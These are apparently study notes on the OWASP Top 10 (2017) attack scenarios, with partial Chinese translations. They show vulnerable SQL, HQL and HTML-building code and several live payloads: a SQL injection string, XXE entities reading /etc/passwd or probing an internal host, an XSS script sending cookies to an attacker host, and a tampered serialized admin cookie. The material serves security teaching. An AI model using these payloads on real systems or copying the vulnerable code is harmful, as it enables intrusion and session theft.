> # A1:2017-Injection (注入攻擊)
- Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:     </br>
情境 #1 應用程序在構建SQL調用時使用以下不受信任的數據易受攻擊的)

        String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";

- Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):     </br>
情境 #2 與以上類似，應用程序對框架的盲目信任仍然可能會導致易受攻擊的查詢

        Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");

- In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: `' or '1'='1`. For example: `http://example.com/app/accountView?id=' or '1'='1 `      </br>
這兩種情況下，攻擊者都會在瀏覽器中修改'id'參數值以發送：`'or'1'='1`，例如:`http://example.com/app/accountView?id= or '1'='1`
        
This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data, or even invoke stored procedures.     </br>
這將更改這兩個查詢的含義以返回帳戶表中的所有記錄。更危險的攻擊可能會修改或刪除數據，甚至調用存儲過程。

># A2:2017-Broken Authentication   (身份驗證功能缺失)  
- Scenario #1: Credential stuffing, the use of lists of known passwords, is a common attack. If an application does not implement automated threat or credential stuffing protections, the application can be used as a password oracle to determine if the credentials are valid.     </br>
憑證填充，使用已知密碼的列表，是一種常見的攻擊。應用程序未實現自動化威脅或憑證填充保護，則可將該應用程序用作密碼預言以確定憑證是否有效。

- Scenario #2: Most authentication attacks occur due to the continued use of passwords as a sole factor. Once considered best practices, password rotation and complexity requirements are viewed as encouraging users to use, and reuse, weak passwords. Organizations are recommended to stop these practices per NIST 800-63 and use multi-factor authentication.     </br>
大多數身份驗證攻擊是因`繼續使用密碼`而發生的。鼓勵用戶使用具復雜性密碼和密碼輪換，避免重複使用弱密碼。

- Scenario #3: Application session timeouts aren't set properly. A user uses a public computer to access an application. Instead of selecting “logout” the user simply closes the browser tab and walks away. An attacker uses the same browser an hour later, and the user is still authenticated.     </br>
使用者在使用公用電腦登入後卻沒有登出，只是關閉視窗。攻擊者在經過一段時間之後使用同一台電腦，卻可以直接登入。
># A3:2017-Sensitive Data Exposure    
- Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. 

- Scenario #2: A site doesn't use or enforce TLS for all pages or supports weak encryption. An attacker monitors network traffic (e.g. at an insecure wireless network), downgrades connections from HTTPS to HTTP, intercepts requests, and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's (authenticated) session, accessing or modifying the user's private data. Instead of the above they could alter all transported data, e.g. the recipient of a money transfer.

- Scenario #3: The password database uses unsalted or simple hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.
># A4:2017-XML External Entities (XXE)    
Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply nested dependencies. The easiest way is to upload a malicious XML file, if accepted:

- Scenario #1: The attacker attempts to extract data from the server:

        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>

- Scenario #2: An attacker probes the server's private network by changing the above ENTITY line to:

        <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
        
- Scenario #3: An attacker attempts a denial-of-service attack by including a potentially endless file:

        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        
># A5:2017-Broken Access Control 
- Scenario #1: The application uses unverified data in a SQL call that is accessing account information:

        pstmt.setString(1, request.getParameter("acct"));
        ResultSet results = pstmt.executeQuery( );
        
An attacker simply modifies the 'acct' parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user's account

        http://example.com/app/accountInfo?acct=notmyacct

- Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.

        http://example.com/app/getappInfo
        http://example.com/app/admin_getappInfo
        
If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.
># A6:2017-Security Misconfiguration    
- Scenario #1: The application server comes with sample applications that are not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. If one of these applications is the admin console, and default accounts weren't changed the attacker logs in with default passwords and takes over.

- Scenario #2: Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a serious access control flaw in the application.

- Scenario #3: The application server's configuration allows detailed error messages, e.g. stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.

- Scenario #4: A cloud service provider has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.
># A7:2017-Cross-Site Scripting (XSS)    
- Scenario #1: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

        (String) page += "<input name='creditcard' type='TEXT'
        value='" + request.getParameter("CC") + "'>";

The attacker modifies the ‘CC’ parameter in the browser to:

        '><script>document.location=
        'http://www.attacker.com/cgi-bin/cookie.cgi?
        foo='+document.cookie</script>'.

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
># A8:2017-Insecure Deserialization    
- Scenario #1: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the "R00" Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.

- Scenario #2: A PHP forum uses PHP object serialization to save a "super" cookie, containing the user's user ID, role, password hash, and other state:

        a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; 
        i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
        
An attacker changes the serialized object to give themselves admin privileges:

        a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
        i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
        
># A9:2017-Using Components with Known Vulnerabilities    
- Scenario #1: Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). Some example exploitable component vulnerabilities discovered are:

+ + CVE-2017-5638, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.
+ + While internet of things (IoT) are frequently difficult or impossible to patch, the importance of patching them can be great (e.g. biomedical devices).
There are automated tools to help attackers find unpatched or misconfigured systems. For example, the Shodan IoT search engine can help you find devices that still suffer from Heartbleed vulnerability that was patched in April 2014.
># A10:2017-Insufficient Logging&Monitoring    
- Scenario #1: An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.

- Scenario #2: An attacker uses scans for users using a common password. They can take over all accounts using this password. For all other users, this scan leaves only one false login behind. After some days, this may be repeated with a different password.

- Scenario #3: A major US retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. The sandbox had been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.
